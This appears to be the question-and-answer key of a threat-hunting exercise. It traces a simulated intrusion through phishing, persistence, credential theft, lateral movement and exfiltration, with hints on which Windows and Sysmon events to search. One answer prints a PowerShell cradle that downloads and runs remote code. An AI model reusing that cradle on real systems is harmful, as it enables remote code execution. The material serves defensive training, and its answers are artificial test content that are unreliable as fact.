Question,Points,Hint,Answer
"What external IP address performed vulnerability scanning against the CCS web server, generating over 50 HTTP 404 errors?",100,Look for IPs generating unusually high 404 error rates against the web server,45.142.212.100
The attacker probed multiple CCS subdomains from 45.142.212.100. Which one reveals the organization is running Microsoft Exchange?,500,The attacker probed multiple CCS subdomains; which one is specific to Microsoft Exchange and reveals mail server infrastructure?,autodiscover.ccs.dev
"What process was spawned as a child of WINWORD.EXE on the initial victim's workstation, indicating a malicious Office document?",100,Look for Office applications spawning command-line processes,cmd.exe
What payload URL is revealed when you decode the base64 -enc parameter in the PowerShell command launched by WINWORD.EXE?,500,Decode the base64 -enc parameter to reveal the download cradle,IEX (New-Object Net.WebClient).DownloadString('https://cdn-update.globalmetrics.net/update')
What C2 domain first appeared in DNS logs immediately after the phishing attachment was opened?,100,Look for DNS queries to domains that have never appeared in the prior 24 hours of logs,cdn-update.globalmetrics.net
The attacker's C2 traffic carries a known JA3 fingerprint of a0e9f5d64349fb13191bc781f81f42e1. What C2 domain did powershell.exe connect to using this fingerprint?,500,Correlate outbound network connections from powershell.exe with ssl.log JA3 hashes. Sysmon EventID 3 (Network Connection) records the destination IP for each process.,cdn-update.globalmetrics.net
What is the full path of the binary configured in the attacker's malicious MicrosoftEdgeUpdate scheduled task?,100,"Legitimate scheduled tasks point to Program Files, not AppData. Check Windows Security logs for scheduled task creation events (search for MicrosoftEdgeUpdate).",C:\Users\lrodriguez\AppData\Roaming\MicrosoftEdge\update.exe
What Registry Run key name was created by the attacker to maintain persistence pointing to an executable in AppData\Roaming?,100,Legitimate OneDrive run keys point to %LOCALAPPDATA% not %APPDATA%\Roaming,OneDriveSync
What is the full path of the malicious Windows service binary installed in an anomalous location?,100,Legitimate service binaries are never installed in Windows Temp. Look for new service installation events in the Windows System log.,C:\Windows\Temp\svchost32.exe
What domain account was impersonated on workstation ccs-ws-1025.ccs.dev to perform privileged network operations?,500,Look for logon events on ccs-ws-1025.ccs.dev where the authenticating account differs from the workstation's regular user. LogonType 9 (NewCredentials) is created by runas /netonly and indicates stolen credentials being used for network access.,awilliams
What binary was launched at High integrity level by eventvwr.exe as a UAC bypass on the victim workstation?,500,eventvwr.exe is a known UAC bypass vector; look for it as a parent process,C:\Windows\Temp\svchost32.exe
What local account was created on a non-domain-controller workstation using an impersonated IT admin token?,100,Account creation events on non-IT workstations are suspicious. Search Windows Security logs for account creation and filter out events originating from domain controllers.,ccssupport
What user account cleared the Windows Security event log?,100,Clearing the security log is an extremely rare event that generates its own log entry. Search Windows Security logs for log-clear events (EventID 1102).,ccssupport
What executable in AppData had its file creation timestamp modified to conceal the malware's true age?,500,Sysmon records when a file's creation timestamp is deliberately changed (EventID 2). Look for executables in AppData paths with modified timestamps.,C:\Users\lrodriguez\AppData\Roaming\MicrosoftEdge\update.exe
"What process accessed LSASS memory from a non-standard path, indicating a credential dumping attempt?",250,LSASS access from non-system paths is a strong credential dumping indicator. Sysmon logs process access events (EventID 10) including which process opened a handle to another and with what access rights.,C:\Windows\Temp\svchost32.exe
What service account was most heavily targeted during the attacker's Kerberos ticket harvesting activity?,250,"Kerberoasting requests TGS tickets using weak RC4 encryption instead of modern AES. Look for Kerberos ticket request events (EventID 4769) with TicketEncryptionType ""0x17"" and find which service account appears most frequently.",svc_sql
"What account was identified as not requiring Kerberos pre-authentication, making it vulnerable to offline password cracking without needing valid credentials?",500,AS-REP Roasting targets accounts with Kerberos pre-authentication disabled. Look for Kerberos authentication request events (EventID 4768) where PreAuthType=0.,svc_scan
What built-in Windows command did the attacker run to enumerate all user accounts in the Active Directory domain?,250,Look for Windows built-in tools being spawned by a suspicious process running from C:\Windows\Temp. The specific command reveals what domain information the attacker was after.,net user /domain
"What user account triggered a massive spike in Active Directory object access events within a 10-minute window, consistent with automated domain enumeration?",500,BloodHound generates hundreds of LDAP object access events per minute. Look for spikes in Active Directory object access events (EventID 4662) and find the account responsible.,lrodriguez
What source IP authenticated to the file server CCS-FS01 from a workstation that has no normal business reason to access it?,250,Lateral movement to a file server often appears as a network logon (LogonType 3) in Windows Security logs (EventID 4624). Look for authentications to ccs-fs01.ccs.dev from unexpected source IPs.,10.10.10.76
What well-known PsExec artifact service name was installed on CCS-WS-1010?,250,PsExec always installs a recognizable service on the target system. Check Windows System logs for new service installation events (EventID 7045) on CCS-WS-1010.,PSEXESVC
What user account remotely connected from an IT workstation to an executive laptop?,100,"Remote Desktop connections appear as interactive logons in Windows Security logs (EventID 4624, LogonType 10). An IT workstation connecting to an executive laptop is an unusual pairing worth investigating.",awilliams
What source IP sent over 100 MB of SMB data to the file server (10.10.2.10) on port 445 outside business hours?,250,Look for abnormally large SMB data volumes to the file server outside business hours,10.10.10.61
What server IP made an unusual server-to-server PostgreSQL (port 5432) connection to the database server at 10.10.2.20?,500,Normally only workstations connect to DB01; connections from FS01 are unusual,10.10.2.10
"What external IP received 6 large HTTPS sessions (each over 80 MB) from the file server at 2am, identifying the exfiltration destination?",250,Large outbound transfers from a server at 2am are a strong exfiltration indicator,185.250.151.84
What domain appeared for the first time in DNS logs from the file server immediately before the overnight exfiltration event?,100,The exfil domain will appear as a first-ever DNS query from the file server,telemetry.syncanalytics.io
"What parent domain received hundreds of subdomain queries from the victim workstation CCS-WS-1025, suggesting DNS was being used as a covert data channel?",500,Look for a parent domain that received a disproportionately large number of DNS queries from 10.10.10.76. Legitimate browsing spreads queries across many domains; tunneling concentrates them on one.,r3solve-stats.com
What archive utility created a password-protected archive in ProgramData\MicrosoftTelemetry for data staging?,100,Password-protected archives are used to prevent analysis of exfiltrated data. Check Sysmon process creation logs (EventID 1) for compression tools run with a password flag.,7z.exe
